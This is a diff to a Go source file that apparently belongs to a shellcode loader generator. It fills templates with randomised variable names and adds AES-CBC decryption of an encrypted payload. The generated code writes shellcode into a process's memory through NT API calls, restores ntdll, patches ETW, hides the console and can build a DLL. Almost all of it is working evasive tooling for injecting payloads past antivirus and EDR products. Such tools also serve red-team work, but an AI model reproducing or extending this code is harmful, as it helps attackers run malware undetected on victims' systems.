@@ -24,6 +24,13 @@ type Sandbox struct {
 	Variables map[string]string
 }
 
+type Encrypt struct {
+	Variables map[string]string
+}
+type Hex struct {
+	Variables map[string]string
+}
+
 var (
 	buffer bytes.Buffer
 )
@@ -35,7 +42,7 @@ func DLLfunction(export string) string {
 	if export != "" {
 		DLL.Variables["ExportFunction"] = `//export ` + export + `
 	func ` + export + `() {
-		Run()
+		Main()
 	}`
 	} else {
 		DLL.Variables["ExportFunction"] = ``
@@ -53,7 +60,7 @@ func DLLfunction(export string) string {
 
 }
 
-func MainFunction(shellcodeencoded string, mode string, console bool, exportable string, sandbox bool, process string) string {
+func MainFunction(shellcodeencoded string, mode string, console bool, exportable string, sandbox bool, process string, encrypt bool, b64ciphertext string, b64key string, b64iv string) string {
 	var buffer bytes.Buffer
 	Main := &Main{}
 	Main.Variables = make(map[string]string)
@@ -61,8 +68,11 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 	Console.Variables = make(map[string]string)
 	Sandbox := &Sandbox{}
 	Sandbox.Variables = make(map[string]string)
+	Encrypt := &Encrypt{}
+	Encrypt.Variables = make(map[string]string)
+	Hex := &Hex{}
+	Hex.Variables = make(map[string]string)
 	Main.Variables["process"] = process
-	Main.Variables["shellcodeencoded"] = shellcodeencoded
 	Main.Variables["modntdll"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["funcNtReadVirtualMemory"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["modkernel32"] = Utils.VarNumberLength(4, 9)
@@ -151,7 +161,6 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 	Main.Variables["nbr"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["ret"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["Shellcode"] = Utils.VarNumberLength(4, 9)
-	Main.Variables["hexcode"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["shellcode"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
@@ -161,13 +170,68 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 	Main.Variables["psapi"] = Utils.VarNumberLength(4, 9)
 	Main.Variables["EnumPageFilesW"] = Utils.VarNumberLength(4, 9)
 
-	if mode == "dll" {
-		Main.Variables["Starting Function"] = exportable
-	} else {
-		Main.Variables["Starting Function"] = `func main(){`
+	if encrypt == true {
+		Main.Variables["CryptImports"] = `"crypto/aes"
+		"crypto/cipher"
+		"encoding/base64"`
+		Encrypt.Variables["fullciphertext"] = b64ciphertext
+		Encrypt.Variables["key"] = b64key
+		Encrypt.Variables["iv"] = b64iv
+		Encrypt.Variables["vkey"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["viv"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["block"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["decrypted"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["mode"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["vciphertext"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["rawdata"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["stuff"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["raw_bin"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["hexdata"] = Utils.VarNumberLength(10, 19)
+		Main.Variables["hexdata"] = Encrypt.Variables["hexdata"]
+		Encrypt.Variables["PKCS5UnPadding"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["length"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["src"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["unpadding"] = Utils.VarNumberLength(10, 19)
+		Encrypt.Variables["Shellcode"] = Main.Variables["Shellcode"]
+		Encrypt.Variables["shellcode"] = Main.Variables["shellcode"]
+
+		buffer.Reset()
+
+		EncryptTemplate, err := template.New("Encrypt").Parse(Struct.Encrypt())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := EncryptTemplate.Execute(&buffer, Encrypt); err != nil {
+			log.Fatal(err)
+		}
+		Main.Variables["ShellcodeStart"] = buffer.String()
+	} else if encrypt == false {
+		Main.Variables["CryptImports"] = ""
+		Hex.Variables["shellcodeencoded"] = shellcodeencoded
+		Hex.Variables["hexdata"] = Utils.VarNumberLength(4, 9)
+		Main.Variables["hexdata"] = Hex.Variables["hexdata"]
+		Hex.Variables["Shellcode"] = Main.Variables["Shellcode"]
+		Hex.Variables["shellcode"] = Main.Variables["shellcode"]
+
+		HexTemplate, err := template.New("Hex").Parse(Struct.Hex())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := HexTemplate.Execute(&buffer, Hex); err != nil {
+			log.Fatal(err)
+		}
+		Main.Variables["ShellcodeStart"] = buffer.String()
 	}
 
-	if mode != "dll" && console == true {
+	if mode == "dll" {
+		Main.Variables["StartingFunction"] = exportable
+		Main.Variables["ImportC"] = `import "C"`
+	} else {
+		Main.Variables["StartingFunction"] = `func main(){`
+		Main.Variables["ImportC"] = ""
+	}
+
+	if mode != "dll" && console == false {
 		Console.Variables["Console"] = Utils.VarNumberLength(4, 9)
 		Console.Variables["GetConsoleWindowName"] = Utils.VarNumberLength(4, 9)
 		Console.Variables["ShowWindowName"] = Utils.VarNumberLength(4, 9)
@@ -177,6 +241,26 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 		Console.Variables["show"] = Utils.VarNumberLength(4, 9)
 		Console.Variables["SW_RESTORE"] = Utils.VarNumberLength(4, 9)
 		Console.Variables["SW_HIDE"] = Utils.VarNumberLength(4, 9)
+		Main.Variables["Debug"] = ""
+		Main.Variables["DebugImport"] = ""
+		Main.Variables["CreatingSuspended"] = ""
+		Main.Variables["ProcessIDdebug"] = ""
+		Main.Variables["ProcessID"] = ""
+		Main.Variables["Creating"] = ""
+		Main.Variables["Handle"] = ""
+		Main.Variables["Parsing"] = ""
+		Main.Variables["Reading"] = ""
+		Main.Variables["ntdllsizefmtdebug"] = ""
+		Main.Variables["ntdlloffsetfmtdebug"] = ""
+		Main.Variables["NTDLL"] = ""
+		Main.Variables["Restoring"] = ""
+		Main.Variables["Restored"] = ""
+		Main.Variables["ETWdebug"] = ""
+		Main.Variables["Shellcodedebug"] = ""
+
+		Main.Variables["NtAllocateVirtualMemory"] = ""
+		Main.Variables["NtWriteVirtualMemory"] = ""
+		Main.Variables["NtProtectVirtualMemory"] = ""
 		buffer.Reset()
 		ConsoleTemplate, err := template.New("Console").Parse(Struct.Console())
 		if err != nil {
@@ -189,15 +273,9 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 		}
 		Main.Variables["Console"] = buffer.String()
 
-		Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["size"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["oldProtect"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["size"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["psapi"] = Utils.VarNumberLength(4, 9)
-		Main.Variables["EnumPageFilesW"] = Utils.VarNumberLength(4, 9)
+		Main.Variables["hide"] = Console.Variables["Console"] + "(false)"
 
-		Main.Variables["hide"] = Console.Variables["Console"] + "(true)"
+	} else if (mode != "dll" && console == true) || mode == "dll" {
 		Main.Variables["DebugImport"] = `"io"`
 		Main.Variables["Debug"] = `
 		var (
@@ -235,29 +313,8 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 		Main.Variables["NtWriteVirtualMemory"] = "printDebug(\"[*] Calling NtWriteVirtualMemory\")"
 		Main.Variables["NtProtectVirtualMemory"] = "printDebug(\"[*] Calling NtProtectVirtualMemory\")"
 
-	} else if (mode != "dll" && console == false) || mode == "dll" {
 		Main.Variables["hide"] = ""
 		Main.Variables["Console"] = ""
-		Main.Variables["Debug"] = ""
-		Main.Variables["DebugImport"] = ""
-		Main.Variables["CreatingSuspended"] = ""
-		Main.Variables["ProcessIDdebug"] = ""
-		Main.Variables["ProcessID"] = ""
-		Main.Variables["Creating"] = ""
-		Main.Variables["Handle"] = ""
-		Main.Variables["Parsing"] = ""
-		Main.Variables["Reading"] = ""
-		Main.Variables["ntdllsizefmtdebug"] = ""
-		Main.Variables["ntdlloffsetfmtdebug"] = ""
-		Main.Variables["NTDLL"] = ""
-		Main.Variables["Restoring"] = ""
-		Main.Variables["Restored"] = ""
-		Main.Variables["ETWdebug"] = ""
-		Main.Variables["Shellcodedebug"] = ""
-
-		Main.Variables["NtAllocateVirtualMemory"] = ""
-		Main.Variables["NtWriteVirtualMemory"] = ""
-		Main.Variables["NtProtectVirtualMemory"] = ""
 	}
 	buffer.Reset()
 
@@ -307,7 +364,7 @@ func MainFunction(shellcodeencoded string, mode string, console bool, exportable
 	return buffer.String()
 }
 
-func CompileFile(shellcodeencoded string, outFile string, console bool, mode string, export string, sandbox bool, process string) string {
+func CompileFile(shellcodeencoded string, b64ciphertext string, b64key string, b64iv string, outFile string, console bool, mode string, export string, sandbox bool, process string, encrypt bool) string {
 	var exporttable string
 	if mode == "dll" {
 		exporttable = DLLfunction(export)
@@ -315,7 +372,7 @@ func CompileFile(shellcodeencoded string, outFile string, console bool, mode str
 		exporttable = ""
 	}
 
-	code := MainFunction(shellcodeencoded, mode, console, exporttable, sandbox, process)
+	code := MainFunction(shellcodeencoded, mode, console, exporttable, sandbox, process, encrypt, b64ciphertext, b64key, b64iv)
 	os.MkdirAll(outFile+"fldr", os.ModePerm)
 	Utils.Writefile(outFile+"fldr/"+outFile+".go", code)
 	os.Chdir(outFile + "fldr")
